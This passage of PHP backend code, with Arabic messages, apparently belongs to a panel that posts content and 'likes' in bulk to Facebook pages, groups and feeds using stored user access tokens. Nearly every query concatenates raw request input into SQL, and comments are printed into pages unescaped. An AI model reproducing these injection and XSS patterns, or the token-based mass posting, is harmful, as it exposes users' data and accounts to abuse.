        $i= array(
      "pid"=>$_POST['pid'],
      "uid"=>$_POST['uid'],
      "uname"=>$_POST['uname'],
      "comment"=>$_POST['comment'],
      "date"=>time(),
      );
      $Sql = SqlIn('comment',$i);
     if($Sql){
            echo    json_encode( array('st'=>'ok','msg'=>'تم اضافة التعليق بنجاح'));

     }else{
            echo    json_encode( array('st'=>'error','msg'=>'عذرا  حدث  خطأ ما  حاول مره اخرى'));

     }
    }else{
        $id = isv("com",1);
     $com= getUser('comment',' where pid='.$id); if($com){ for($i=0;$i<count($com);$i++){
 $v = $com[$i];
?>
<div class="comment col m12">
                                    <div class="col m2 right center ">
                					    <a href="<?=Fb($v['uid'])?>"><img src="<?=FbImg($v['uid'])?>" class=" circle img-responsive "></a>
                                    </div>
                                    <div class="col m10">
										<div class="who">
                                        	<a  style="    display: inline-block;" href="<?=Fb($v['uid'])?>"><?=$v['uname']?></a>
                                            <span style="    font-size: 80%;" > - <?=cptime($v['date'])?></span>
                                        </div>
                                        <div class="txt">
										<?=$v['comment']?>
                                        </div>
                                        <!--
                                        <div class="options">
                                        	<a href="">أعجبني</a>
                                            <div class="dot">•</div>
                                        	<a href="">رد</a>
                                        </div>
                                        -->
                                    </div>
                                </div><!-- /comment --> <!-- /comment -->
<?php }  }
    }}else if($_GET['step'] == 'Addpost'){
    if(isset($_POST['time'])){
if(!Ls('demo')){
        if(isset($_POST['time'])){
      $type =  $_POST['type'];
      $url =  $_POST['url'];
      $img =  $_POST['img'];
     $post = $_POST['post'];
     $tags = $_POST['tags'];
     $short = $_POST['short'];
     $cat = $_POST['cat'];
      $time =  strtotime($_POST['time']);
        $id = $_SESSION['id'];
        $name = $_SESSION['sname'];
        $t=  html_entity_decode(stripslashes(str_replace('\n','
        ',trim($_POST['post']))));
             $SR= Num('posts'," where text like '%$t%' order by id desc");
$Rn= Num('posts'," where userid=".userid);
if(strlen($t) <= 140){$tw =1;}else {$tw =0;};
if($SR > 0 and $type != 2 and $type != 7){
$R=1;
}
if($type == 2){
 $url = $img;
}else if ($type == 7){
$title =  $_POST['title'];
$youtube = get_youtube($url);
$img =  $youtube['thumbnail_url'];
$findme ="vi/";
$f = strpos($img,$findme);
 $vid =  substr($img,$f + 3);
$vid =str_replace('/hqdefault.jpg','',$vid);
if(!$title){
$title = $youtube['title'];

}
      $i= array(
      "description"=>$post,
      "title"=>$title,
      "link"=>$url,
      "img"=>$img,
      "vid"=>$vid,
      "cat"=>$cat,
      "userid"=>$id,
      "date"=>time(),
       "active"=>Ls('admin'),
      );

      $Sql = SqlIn('video',$i);
      $vid= mysqli_insert_id();

$url = Uvideo($vid);
}

      $i= array(
      "text"=>$t,
      "link"=>$url,
      "type"=>$type,
      "vid"=>$vid,
      "ttype"=>$tw,
      "userid"=>$id,
      "cat"=>$cat,
      "date"=>time(),
      "time_share"=>$time,
      "time"=>1,
      "active"=>Ls('admin'),
      "R"=>$R,
      "tags"=>$tags,
      "short"=>$short,
      );

      $Sql = SqlIn('posts',$i);
      $id= mysqli_insert_id();
     if($Sql){
     $num = 1+ Num("posts","where userid=".$id);
     $D=   UpDate($appsql,'num',$num,"where user_id=".$id);

        echo json_encode( array('st'=>'ok','pid'=>$id,'R'=>$R,'Rn'=>$Rn,'msg'=>'تم اضافة المنشور بنجاح'));
         }
        }else{
            echo json_encode( array('st'=>'error','msg'=>'قم بااختيار الوقت اولا'));
        }
               }else{       echo json_encode( array('st'=>'error','msg'=>'عذرا لاتمتلك التصريح'));}

    }else if($_GET['step'] == 'AddT'){
 $pid =  $_POST['pid'];
 $Sql = Selaa('posts','where id="'.$pid.'"');
 $type =  $Sql['type'];
$post =  $Sql['text'];
$img =  $Sql['link'];
$id = $_SESSION['id'];

     if($Sql){
        echo json_encode( array('st'=>'ok','pid'=>$id,'type'=>$type,'post'=>$post,'img'=>$img,'msg'=>'تم جلب المنشور بنجاح'));

        }else{
            echo json_encode( array('st'=>'error','msg'=>'حدث خطأ ما لم يتم النشر'));
        }


    }else{
     header("Location: ../");
     }

}else if($_GET['step'] == 'get_video'){
    if(isset($_POST['url'])){
$url =$_POST['url'];
$youtube = get_youtube($url);
$img =  $youtube['thumbnail_url'];
$title = $youtube['title'];
     if($youtube){
          echo json_encode( array('st'=>'success','title'=>$title,'img'=>$img,'post'=>$post,'msg'=>'تم جلب معلومات الفديو'));
      }else{
       echo json_encode( array('st'=>'error','msg'=>'حدث  خطأ فى جلب معلومات الفديو'));

     }
    }else{
     header("Location: ../");
     }

     }else if($_GET['step'] == 'get_url'){
    if(isset($_POST['url'])){
$url =$_POST['url'];
$url = get_url($url);
$title =  $url['title'];
$description = $url['description'];
$keywords = $url['keywords'];
$img = $url['img'];
     if($url['title']){
          echo json_encode( array('st'=>'success','img'=>$img,'title'=>$title,'description'=>$description,'keywords'=>$keywords,'msg'=>'تم جلب معلومات الرابط'));
      }else{
       if(strpos($_POST['url'],"facebook.com")){
       echo json_encode( array('st'=>'error','type'=>'face','msg'=>''));
           }else{
       echo json_encode( array('st'=>'error','type'=>'url','msg'=>'حدث  خطأ فى جلب معلومات  الرابط'));
           }
     }
    }else{
     header("Location: ../");
     }

     }else if($_GET['step'] == 'video_dw'){
    if(isset($_POST['id'])){

$id =$_POST['id'];
$S= Sel('video','where id='.$id);
$youtube = UpDate('video','num_dw', $S->num + 1,'where id='.$id);
     if($youtube){
          echo json_encode( array('st'=>'success','R'=>$R,'url'=>$link,'msg'=>'تم التحميل بنجاح'));
      }else{
       echo json_encode( array('st'=>'error','msg'=>'حدث  خطأ فى جلب معلومات الفديو'));

     }
    }else{
     header("Location: ../");
     }

     }else if($_GET['step'] == 'nosend'){
if(Ls('admin')){
     if(!isv('id')){
$youtube = Remove($appsql,'where send="0" ');
}else{
//$youtube = SqlEmpty(isv('id'));
$youtube = Remove(isv('id'),' where app !="htc" ');

}
     if($youtube){
          echo json_encode( array('st'=>'success','R'=>$R,'url'=>$link,'msg'=>'تم الحذف بنجاح'));
      }else{
       echo json_encode( array('st'=>'error','msg'=>'حدث خطأ ما'));

     }
           }else{       echo json_encode( array('st'=>'error','msg'=>'عذرا لاتمتلك التصريح'));}

     }else if($_GET['step'] == 'fb_post'){
    if(isset($_POST['pid'])){
if(!Ls('demo') and $app['end'] == 1){
 $id =  $_POST['pid'];
 $type =  $_POST['type'];
 if($type != 'video'){
    UpDate("posts",'send',1,'where id='.$id);

 }else{
         UpDate("settings",'video',0);
    $S = Sel('posts','where vid='.$id);
  $id=  $S->id;
if($S){
      UpDate("posts",'send',1,'where vid='.$id);
}else{
      $S = Sel('video','where id='.$id);
     $i= array(
     "text"=>$S->title,
     "link"=>Uvideo($S->id),
     "type"=>7,
     "vid"=>$S->id,
     "userid"=>$_SESSION['id'],
     "send"=>1,
     "date"=>time(),
     "active"=>Ls('admin'),
     );
      $Sql = SqlIn('posts',$i);
     $id = mysqli_insert_id();
}
 }
$count= Num($appsql);
$uid= Sel($appsql,' order by id desc ')->id;
    $i= array(
      "postid"=>$id,
      "type"=>"fb",
      "time"=>time(),
      "count"=>$count,
      "idu"=>0,
      "eid"=>$uid,
      );

      $Sql = SqlIn('task',$i);

           if($Sql){
        echo json_encode( array('st'=>'ok','pid'=>$id,'type'=>$type,'Rn'=>$Rn,'msg'=>'تم نشر المنشور بنجاح'));

        }else{
            echo json_encode( array('st'=>'error','msg'=>'حدث خطأ ما لم يتم النشر'));


       }


               }else{       echo json_encode( array('st'=>'error','msg'=>'عذرا لاتمتلك التصريح'));}
    }else{
     header("Location: ../");
     }

     }else if($_GET['step'] == 'post_num'){
    if(isset($_POST['pid']) or isset($_POST['type']) ){
      $pid = $_POST['pid'];
   $Sql = Selaa('posts','where id="'.$pid.'"');
 $type =  $Sql['type'];
 $url =  $Sql['link'];
$post =  $Sql['text'];
$Nshare =  $Sql['Nshare'] + 1;
$img =  $Sql['link'];
$id = $_SESSION['id'];
UpDate('posts','Nshare',$Nshare,' where id='.$pid);
            echo json_encode( array('st'=>'success','msg'=>'حدث خطأ ما لم يتم النشر'));

    }else{
     header("Location: ../");
     }

     }else if($_GET['step'] == 'YD'){
$v=  $_POST['url'];
$Dvideo = Get_Img($v,0,'../tmp/',1);

   if($Dvideo){
        echo json_encode( array('st'=>'success','link'=>$Dvideo,'msg'=>'تم تحميل الفديو ورفعه '));
     }else{
        echo json_encode( array('st'=>'error','link'=>$v,'msg'=>"حدث خطأ ما"));

     }


     }else if($_GET['step'] == 'YUpload'){
  $v =  $_POST['video'];
$link=  $_POST['url'];
$title=  $_POST['title'];
//$link = Dvideo($vid)['url'];
//$title = Dvideo($vid)['title'];
$tags = array($St->title,$title);
$des =$title.'  #'.Rstr($St->title,' ','_');
$Dvideo = Get_Img($link,0,'../tmp/',1);
//$img = Get_Img($img);
if($Dvideo){
$url = $Dvideo;
$a = array('url'=>'../'.$url,'title'=>$title,'des'=>$des,'cat'=>27,'tags'=>$tags);
$uvid = YUpload($a);
if($uvid[0]){
$vid = $uvid[1];
$url = "https://www.youtube.com/watch?v=".$uvid[1];
$sq = UpDate('video','link',$url,'where vid="'.$v.'"');
$sq = UpDate('video','cat',0,'where vid="'.$v.'"');
$sq = UpDate('video','vid',$vid,'where vid="'.$v.'"');
}else{
$sq = false;
$msg = "حدث خطأ ما";
}
$file ='../'.$url;
unlink($file);
}else{
$sq = false;
$msg = "لم يتم التحميل";
}
    if($sq){
        echo json_encode( array('st'=>'success','msg'=>'تم تحميل الفديو ورفعه '));
     }else{
        echo json_encode( array('st'=>'error','msg'=>$msg));

     }
     }else if($_GET['step'] == 'link'){
    echo unlink('../tmp/0841693001469622090.png');

     }else if($_GET['step'] == 'likes'){
 $pid =  $_POST['postid'];
 $gr = $_POST['type_user'];
 $npost =  $_POST['numposts'];
 $appsql="users";
 if($_POST['allcantry'] != 'all'){
 $cantry =  substr($_POST['cantry'],1,strlen($_POST['cantry']));
}else{
 $cantry =  $_POST['allcantry'];
}
if($gr == 'all' and $cantry == 'all'){
$count= Num($appsql,'where app="htc"');
$where = "";
    }else if($cantry != 'all'  and $gr != 'all' ){
  $cc = str_replace(",", '","', $cantry);
$count= Num($appsql,'where  `cantry` IN  ("'.$cc.'") and app="htc" and type="'.$gr.'" ');
$where = 'where  `cantry` IN  ("'.$cc.'") and app="htc" and type='.$gr;
    }else if($cantry != 'all'  and $gr == 'all' ){
  $cc = str_replace(",", '","', $cantry);
$count= Num($appsql,'where  `cantry` IN  ("'.$cc.'") and app="htc" ');
$where = 'where  `cantry` IN  ("'.$cc.'") ';
    }else {
$count= Num($appsql,'where app="htc" and type="'.$gr.'"');
$where = 'where type='.$gr;
    }
//$eid = Sel($appsql,' $where order by id desc ')->id;
      $i= array(
      "postid"=>$pid,
      "type"=>"likes",
      "tp"=>$npost,
      "gr"=>$gr,
      "app"=>$cantry,
      "time"=>time(),
      "count"=>$npost,
      "idu"=>0,
      );
      $Sql = SqlIn('task',$i);
if($Sql){
        echo json_encode( array('st'=>'ok','msg'=>'جارى الارسال الان'));
 }else{
        echo json_encode( array('st'=>'error','msg'=>'عذرا حدث خطأ ما'));

 }
     }else if($_GET['step'] == 'gopost'){
         $id = isv("id");
         $nid= isv("nid");
         $time= isv("time");
         $pages= isv("pages");
         $GP = "pages";
         if($pages != "false"){
             $GP = "groups";
         }
     $tags = isv("tags");

         if(!$nid){

       $nid =  nUser($nid,isv("where"));
         }else{
             //sleep($time);
         }
 $S = Sel("posts","where id=".$id);
$gname = Sel($GP,"where id=".nUser($nid,isv("where")))->name;

 if($S){
 $type = $S->type;
if ($type == 2 or $type == 5){
         //$postb['image'] = '@../'.$url;
         $postb['url'] = $S->link;
        }else if ($type == 1){
         $postb['link'] =$S->link;
        } else if ($type == 7){
         $postb['link'] = Uvideo($S->vid);
        }
$postb['message'] = html_entity_decode(stripslashes(str_replace('\n','
        ',$S->text)));

        if(Num($GP,"where id=".$nid)){
                $p = Selaa($GP,"where id=".$nid);
                  $pid = $p['pid'];
                  $name = $p['name'];
                  $u =  Sel($appsql,"where user_id=".$p['uid']);
    $postb['access_token'] =$u->access;
  if($GP == "pages"){
           $postb['access_token'] = getPage($p['uid'],$p['pid'],true);
                            }
if(!isv("nid")){
$add =Tpost($type,$p['uid'],$postb,$tags);
if(!$add['id']) { $msg =  $add['error']['message'];   }
}
$ad =Tpost($type,$pid,$postb,false);
$ad["id"] = 1;
if(!$ad['id']){ $e = $ad['error']['message']; }
$nid =  nUser($nid,isv("where"));
 if($ad['id']){
        echo json_encode( array('st'=>'done',"f"=>isv("nid"),"name"=>$gname,"prom"=>$msg,"pro"=>$add['id'],"where"=>isv("where"),"nid"=>$nid,"pid"=>$id,'msg'=>'تم نشر المنشور بنجاح علــ  <a target="_blank" href="'.Fburl($ad['id']).'">'.$name.'</a>'));
        }else{
            echo json_encode( array('st'=>'done1',"f"=>isv("nid"),"name"=>$gname,"prom"=>$msg,"pro"=>$add['id'],"where"=>isv("where"),"nid"=>$nid,"pid"=>$id,'msg'=>$e));
        }
        }else{
            echo json_encode(array('st'=>'error','msg'=>"عذرا لايوجد لديك حسابات"));

}
        }else{
            echo json_encode(array('st'=>'error','msg'=>'خطأ فى المنشور'));

}

     }else if($_GET['step'] == 'post_now'){
    if(isset($_POST['pid']) or isset($_POST['type']) ){

if(!Ls('demo') and $app['end'] == 1){

 $pid =  $_POST['pid'];
 $Yd =  $_POST['Yd'];
      $cat = $_POST['cat'];
      $gr = $_POST['type_user'];
     $tags = $_POST['tags'];
      $short = $_POST['short'];
 $ttype =  $_POST['ttype'];
 $Stype =  $_POST['Stype'];
 $pages =  $_POST['pages'];
 if(isset($_POST['pages'])){
 $Spages = substr($_POST['Spages'],1,strlen($_POST['Spages']));;
 $cc = str_replace(",", '","', $Spages);
$whereg= 'where  `id` IN  ("'.$cc.'") ';

}
if($_POST['allcantry'] != 'all'){
 $cantry =  substr($_POST['cantry'],1,strlen($_POST['cantry']));
}else{
 $cantry =  $_POST['allcantry'];
}
 $add_time =  $_POST['add_time'];
$id = $_SESSION['id'];
if(!$pid){
 $type =  $_POST['type'];
$post =  trim($_POST['post']);
$img =  $_POST['img'];
$url =  $_POST['url'];
$Durl =  $_POST['Durl'];
$Nmurl =  $_POST['Nmurl'];
if($type == 2 or $type == 5){
$url =  $img;
$img = $_POST['url'];
}else if ($type == 7){
$title =  $_POST['title'];
$youtub = get_youtube($url);
$img =  $youtub['thumbnail_url'];
if(!$title){$title = $youtub['title'];}
$tags = array($St->title,$title);
$des =$title.'  #'.Rstr($St->title,' ','_');
$findme ="vi/";
$f = strpos($img,$findme);
 $vid =  substr($img,$f + 3);
$vid =str_replace('/hqdefault.jpg','',$vid);
$link = Dvideo($vid)['url'];
if(Ls('admin') and Sion('Ytoken') and $Yd){
$Dvideo = Get_Img($link,0,'../tmp/',1);
     }else{ $Dvideo = false;}
$img = Uimgur($img)[1];
if($Dvideo){
$urll = $Dvideo;
$a = array('url'=>'../'.$Dvideo,'title'=>$title,'des'=>$des,'cat'=>27,'tags'=>$tags);
$uvid = YUpload($a);
if($uvid[0]){
$vid = $uvid[1];
$Dvideo = 0;
$url = "https://www.youtube.com/watch?v=".$uvid[1];
}
$Dvideo = 1;
$vvideo=false;
$file ='../'.$urll;
unlink($file);
}else{
$Dvideo = 1;
$vvideo = $vid;
}

      $i= array(
      "description"=>$post,
      "title"=>$title,
      "link"=>$url,
      "img"=>$img,
      "cat"=>$Dvideo,
      "vid"=>$vid,
      "userid"=>$id,
      "date"=>time(),
       "active"=>Ls('admin'),
      );

      $Sql = SqlIn('video',$i);
      $vid= mysqli_insert_id();

$url = Uvideo($vid);
}
$admin =  $_POST['admin'];

}else{
 $Sql = Selaa('posts','where id="'.$pid.'"');
 $type =  $Sql['type'];
 $url =  $Sql['link'];
$post =  $Sql['text'];
$Nshare =  $Sql['Nshare'] + 1;
$img =  $Sql['link'];
$id = $_SESSION['id'];
UpDate('posts','Nshare',$Nshare,' where id='.$pid);
}

if ($type == 2 or $type == 5 or $type == 6){
         //$postb['image'] = '@../'.$url;
         $postb['url'] = $url;
        }else if ($type == 1){
         $postb['link'] =$url;
        } else if ($type == 7 or $type == 4){
         $postb['link'] = $url;
        }


$t = html_entity_decode(stripslashes(str_replace('\n','
        ',$post)));
$postb['message'] = $t;
$postb['access_token'] = $_SESSION['spass'];
$SR= Num('posts'," where text like '%$t%' order by id desc");
if(!Ls('admin')) {
$Rn= Num('posts'," where userid=".$id);
     }else{
$Rn=2;
     }
if($ttype == 'fb' and $Stype != 'token' and $admin > 1){
if($pages){
$ttype ='pages';
$count= Num('pages');
$eid = Sel('pages',' order by id desc ')->id;
}else{
if($gr == 'all' and $cantry == 'all'){
$count= Num($appsql);
$where = "";
    }else if($cantry != 'all'  and $gr != 'all' ){
  $cc = str_replace(",", '","', $cantry);
$count= Num($appsql,'where  `cantry` IN  ("'.$cc.'") and type='.$gr);
$where = 'where  `cantry` IN  ("'.$cc.'") and type='.$gr;
    }else if($cantry != 'all'  and $gr == 'all' ){
  $cc = str_replace(",", '","', $cantry);
$count= Num($appsql,'where  `cantry` IN  ("'.$cc.'") ');
$where = 'where  `cantry` IN  ("'.$cc.'") ';
    }else {
$count= Num($appsql,'where type='.$gr);
$where = 'where type='.$gr;
    }
$eid = Sel($appsql,' $where order by id desc ')->id;
   }
}else if($Stype == 'token'){
if($_POST['Ttoken'] == 'fb'){
$count= Num($appsql);
$eid = Sel($appsql,' order by id desc ')->id;
   }else{
$count= Num('users_tw');
$eid = Sel('users_tw',' order by id desc ')->id;
   }
}else if($admin < 1){
$count= Num($appsql);
}else{

$count= Num('users_tw');
$eid = Sel('users_tw',' order by id desc ')->id;

}
if($admin > 0 and $add_time == 0){$admin = 1;}else {$admin =0;};
if($ttype == 'tw' or strlen($postb['message']) <= 140){$tw =1;}else {$tw =0;};

if(!$pid and $count > 0){
if($SR < 1 or $type == 7 or $type == 2 or $type == 5 or $type == 1 or $add_time == 1 or $admin  == 1){
if($Stype == 'nof'){
$ttype ='nof';
$nof =1;
      $i= array(
      "nof"=>$postb['message'],
      "link"=>$url,
      "time"=>time(),
      "send"=>$admin,
      "lq"=>$short,
      );

      $Sql = SqlIn('nof',$i);
      $id= mysqli_insert_id();

  }else if($Stype == 'token'){
$ttype ='token';
$token =1;
      $Sql = 1;
      $id= 0;
      $Ttoken= $_POST['Ttoken'];
      $Dtoken= $_POST['Dtoken'];

  }else{
      $i= array(
      "text"=>$postb['message'],
      "link"=>$url,
      "img"=>$img,
      "tp"=>$Nmurl,
      "des"=>$Durl,
      "type"=>$type,
      "cantry"=>$cantry,
      "gr"=>$gr,
      "vid"=>$vid,
      "cat"=>$cat,
      "ttype"=>$tw,
      "userid"=>$_SESSION['id'],
      "date"=>time(),
       "active"=>Ls('admin'),
      "R"=>$R,
      "tags"=>$tags,
      "short"=>$short,
      "send"=>$admin,
      "tshare"=>$admin,
      );

      $Sql = SqlIn('posts',$i);
      $id= mysqli_insert_id();
      }
}else{
$SR= Sel('posts'," where text like '%$t%' order by id desc");
$id= $SR->id;
 $Sql=1;
  $R=1;
}
}
   if($Sql and $count > 0){
     if($admin == 0 and $add_time == 0){
     if(!$pages){
         /*
         $postb['message'] .='

         '.'#'.str_replace(' ','_',$_SESSION['sname']).'  باستخدام   #'.str_replace(' ','_',$St->title);
         */
                     if(!$htc){
                                 try {
                         if($type ==2){ $ad= $facebook->api('/me/photos/','post',$postb);
                        }else{$ad= $facebook->api('/me/feed','post',$postb);}
                  } catch (FacebookApiException $e) {
                                  $ad=false;
                                 }
                          }else{
$ad =Tpost($type,Sion("id"),$postb,$tags);
if(!$ad['id']){ $e = $ad['error']['message']; }
                          }

     if($ad['id']){
        echo json_encode( array('st'=>'ok','pid'=>$id,'you'=>$vvideo,'R'=>$R,'Rn'=>$Rn,'msg'=>'تم نشر المنشور بنجاح'));

        }else{
            echo json_encode( array('st'=>'error','msg'=>'حدث خطأ ما لم يتم النشر'));
        }

        }else{

       if($pages){
            echo json_encode( array('st'=>'ok',"tags"=>$tags,"type"=>$pages,"where"=>$whereg,"id"=>$id,'msg'=>"جارى النشر الان من فضلك انتظر"));

  /*     for($i=0;$i<count($pages);$i++){
             $p = $pages[$i];
             $pid = $p['pid'];
             $name = $p['name'];

            $u =  Sel($appsql,"where user_id=".$p['uid']);
             $postb['access_token'] = getPage($p['uid'],$p['pid']);
                     if(!$htc){
                                 try {
                         if($type ==2){ $ad= $facebook->api('/'.$pid.'/photos/','post',$postb);
                        }else{$ad= $facebook->api('/'.$pid.'/feed','post',$postb);}
                  } catch (FacebookApiException $e) {
                                  $ad=false;
                                 }
                          }else{
$ad =Tpost($type,$pid,$postb,0);
if(!$ad['id']){ $e = $ad['error']['message']; }
                          }

       }*/

        }
        }

     }else if($add_time == 1){

      if($Sql){
        echo json_encode( array('st'=>'ok','pid'=>$id,'you'=>$vvideo,'R'=>$R,'Rn'=>$Rn,'msg'=>'تم اضافة المنشور بنجاح'));

        }else{
            echo json_encode( array('st'=>'error','msg'=>'حدث خطأ ما لم يتم النشر'));
        }

     }else{
      $i= array(
      "postid"=>$id,
      "type"=>$ttype,
      "tp"=>$Dtoken,
      "app"=>$Ttoken,
      "time"=>time(),
      "count"=>$count,
      "idu"=>0,
      "eid"=>$eid,
      );
      $Sql = SqlIn('task',$i);

           if($Sql){
          if($token){
        echo json_encode( array('st'=>'ok','pid'=>$id,'R'=>$R,'Rn'=>$Rn,'msg'=>'جارى الفحص الان'));
            }else if($nof){
        echo json_encode( array('st'=>'ok','pid'=>$id,'R'=>$R,'Rn'=>$Rn,'msg'=>'جارى ارسال الاشعار'));
            }else{
        echo json_encode( array('st'=>'ok','pid'=>$id,'R'=>$R,'Rn'=>$Rn,'msg'=>'تم نشر المنشور بنجاح'));

            }
        }else{
            echo json_encode( array('st'=>'error','msg'=>'حدث خطأ ما لم يتم النشر'));


       }
     }

     }else if($count < 1){
         if(!$pages){
            echo json_encode( array('st'=>'error','msg'=>'عذرا لايوجد  مستخدمين'));
         }else{
            echo json_encode( array('st'=>'error','msg'=>'عذرا لايوجد  صفحات'));
         }
     }else{
            echo json_encode( array('st'=>'error','msg'=>'حدث خطأ ما'));
        }

               }else{       echo json_encode( array('st'=>'error','msg'=>'عذرا لاتمتلك التصريح'.$app['end']));}

    }else{
     header("Location: ../");
     }
    }else if($_GET['step'] == 'More_images'){
  if($dir) {
if(isset($_POST['id'])){
         $showLimit = 4;
          $SAll= Num('posts',"WHERE id < ".$_POST['id']." and type ='2' or type='5' or type='6' ORDER BY id DESC");
          $post= getUser('posts',"WHERE  id < ".$_POST['id']." and type ='2' or type='5' or type='6' ORDER BY id DESC LIMIT ".$showLimit);
     }else{
         $showLimit = 12;
          $SAll= Num('posts',"WHERE  type ='2' or type='5' or type='6' ORDER BY id DESC");
          $post= getUser('posts',"WHERE  type ='2' or type='5' or type='6' ORDER BY id DESC LIMIT ".$showLimit);

     }
     if($post){
         for($i=0;$i < count($post);$i++){
             $p = $post[$i];
               $tutorial_id = $p["id"];
             $Su =Selaa($appsql,' where user_id='.$p['userid']);
            /* if(!strpos($p['link'],'imgur')){
                 $p['link'] = '../'.$p['link'];
             }*/

     ?>
   	             <div class="col  s12 m3" id="t<?=$tutorial_id?>">
                 <div class="card no-shadow center">
                 <div class="card-image">
                  <img src="<?=$p['link']?>"  alt="">
                              <a class="btn-floating halfway-fab waves-effect waves-light red left">
                                <i class="material-icons">share</i>
                              </a>
                            </div>
                 <div class="card-content" >

                </div>
                 <div class="card-action center" style="    font-size: 13px;">
                               <a class="tooltipped " onclick="fb_share(<?=$p['id']?>);"  data-position="bottom" data-delay="50" data-tooltip="نشر على فيس بوك"><i class="fa fa-facebook-square fa-lg " aria-hidden="true"></i></a>
                <a class="tooltipped" onclick="tw_share(<?=$p['id']?>);" data-position="bottom" data-delay="50" data-tooltip="نشر على تويتر"><i class="fa fa-twitter-square fa-lg" aria-hidden="true"></i></a>
<!--                <a class="tooltipped" onclick="add_time(<?=$p['id']?>);" data-tooltip="النشر لاحقا" data-tooltip-id="ed472c81-cc4c-1ce6-956d-2ac9b8acd67b"><i class="fa fa-calendar-plus-o  fa-lg" aria-hidden="true"></i></a>
-->                         <?php if(Ls('admin') and  $p['active'] == 0 or Ls('demo')  and  $p['active'] == 0){ ?>    <a  class="tooltipped" onclick="A_post(<?=$p['id']?>);" data-tooltip="الموافقه على المنشور" data-tooltip-id="ed472c81-cc4c-1ce6-956d-2ac9b8acd67b"><i class="fa fa-check-circle-o fa-lg" aria-hidden="true"></i></a>     <?php  } ?>
                         <?php if(Ls('admin')  and  $p['active'] == 0 or Ls('demo')  and  $p['active'] == 0){ ?>    <a  class="tooltipped" onclick="Aa_post(<?=$p['id']?>);" data-tooltip="الموافقه على المنشور" data-tooltip-id="ed472c81-cc4c-1ce6-956d-2ac9b8acd67b"><i class="fa fa-check-circle fa-lg" aria-hidden="true"></i></a>     <?php  } ?>
            <?php if(Ls('admin')  or Ls('demo') or $p['userid'] == $userid){ ?>    <a  class="tooltipped" onclick="E_post(<?=$p['id']?>);" data-tooltip="تعديل المنشور" data-tooltip-id="ed472c81-cc4c-1ce6-956d-2ac9b8acd67b"><i class="fa fa-pencil-square-o fa-lg" aria-hidden="true"></i></a>     <?php  } ?>
            <?php if(Ls('admin') or Ls('demo') or $p['userid'] == $userid){ ?>    <a  class="tooltipped" onclick="re(<?=$p['id']?>);" data-tooltip="حذف  المنشور" data-tooltip-id="ed472c81-cc4c-1ce6-956d-2ac9b8acd67b"><i class="fa fa-times fa-lg" aria-hidden="true"></i></a>     <?php  } ?>
            <?php if($p['time'] == 1){ ?>    <a  class="tooltipped" onclick="" data-tooltip="<?=date('g:i A', $p['time_share'])?>" data-tooltip-id="ed472c81-cc4c-1ce6-956d-2ac9b8acd67b"><i class="fa fa-clock-o fa-lg" aria-hidden="true"></i></a>     <?php  } ?>
            <?php if(Ls('admin') or Ls('demo') ){ ?>    <a  class="tooltipped" onclick="fb_post(<?=$p['id']?>)" data-tooltip="نشر الان" data-tooltip-id="ed472c81-cc4c-1ce6-956d-2ac9b8acd67b"><i class="fa fa-send fa-lg" aria-hidden="true"></i></a>     <?php  } ?>
            <?php if(Ls('admin') or Ls('demo') ){ ?>
                                                   <?php if($Su['block'] == 0){ ?>
                                                 <a class="waves-effect waves-light" onclick="ban(<?=$Su['id']?>')" id="<?=$Sb['id']?>" ><i class="fa fa-ban fa-lg " aria-hidden="true"></i></a>
                                                <?php }else{?>
                                                 <a class="waves-effect waves-light" onclick="unban(<?=$Su['id']?>)" id="<?=$Sb['id']?>" ><i class="fa fa-check-circle-o fa-lg " aria-hidden="true"></i></a>

                                                <?php }?>

                 <?php  } ?>

                </div>
                </div>
                </div>
<?php }echo more($tutorial_id,Num('posts',"where id < '".$tutorial_id."' and type ='2' or type='5' or type='6' "),4); }else{ echo NotFound(); }
    }else{
     header("Location: ../");
     }
 }else if($_GET['step'] == 'More_video'){
  if($dir){
if(isset($_POST['id'])){
         $showLimit = 4;
          $SAll= Num('video',"WHERE id < ".$_POST['id']." and active ='1' ORDER BY id DESC");
          $post= getUser('video',"WHERE  id < ".$_POST['id']." and active ='1' ORDER BY id DESC LIMIT ".$showLimit);
}else{
         $showLimit = 12;
          $SAll= Num('video',"WHERE  active ='1' ORDER BY id DESC");
          $post= getUser('video',"WHERE   active ='1' ORDER BY id DESC LIMIT ".$showLimit);


}
if($post){
         for($i=0;$i < count($post);$i++){
             $p = $post[$i];
               $tutorial_id = $p["id"];
             $Su =Selaa($appsql,' where user_id='.$p['userid']);
     ?>
	             <div class="col  s12 m3" id="t<?=$tutorial_id?>">
                 <div class="card no-shadow right-align">
<div class="card-title truncate" style="    direction: rtl;"><a href="<?=Uvideo($p['id'])?>"><?=html_entity_decode(stripslashes(str_replace('\n',' ',limit_str($p['title'],20))))?></a></div>
                 <div class="card-content" style="    padding: 0;    position: relative;">
                 <div class="center post-img post-img-video"><a href="<?=Uvideo($p['id'])?>" >  <img src="<?=$p['img']?>" class=" responsive-img z-depth-1" alt=""></a></div>
                </div>
                 <div class="card-action center" style="display:none">
                               <a class="tooltipped " onclick="fb_share(<?=$p['id']?>);"  data-position="bottom" data-delay="50" data-tooltip="نشر على فيس بوك"><i class="fa fa-facebook-square fa-lg " aria-hidden="true"></i></a>
                <a class="tooltipped" onclick="tw_share(<?=$p['id']?>);" data-position="bottom" data-delay="50" data-tooltip="نشر على تويتر"><i class="fa fa-twitter-square fa-lg" aria-hidden="true"></i></a>
<!--                <a class="tooltipped" onclick="add_time(<?=$p['id']?>);" data-tooltip="النشر لاحقا" data-tooltip-id="ed472c81-cc4c-1ce6-956d-2ac9b8acd67b"><i class="fa fa-calendar-plus-o  fa-lg" aria-hidden="true"></i></a>
-->                         <?php if(Ls('admin') or Ls('demo')  and  $p['active'] == 0){ ?>    <a  class="tooltipped" onclick="A_post(<?=$p['id']?>);" data-tooltip="الموافقه على المنشور" data-tooltip-id="ed472c81-cc4c-1ce6-956d-2ac9b8acd67b"><i class="fa fa-check-circle-o fa-lg" aria-hidden="true"></i></a>     <?php  } ?>
                         <?php if(Ls('admin') and  $p['active'] == 0){ ?>    <a  class="tooltipped" onclick="Aa_post(<?=$p['id']?>);" data-tooltip="الموافقه على المنشور" data-tooltip-id="ed472c81-cc4c-1ce6-956d-2ac9b8acd67b"><i class="fa fa-check-circle fa-lg" aria-hidden="true"></i></a>     <?php  } ?>
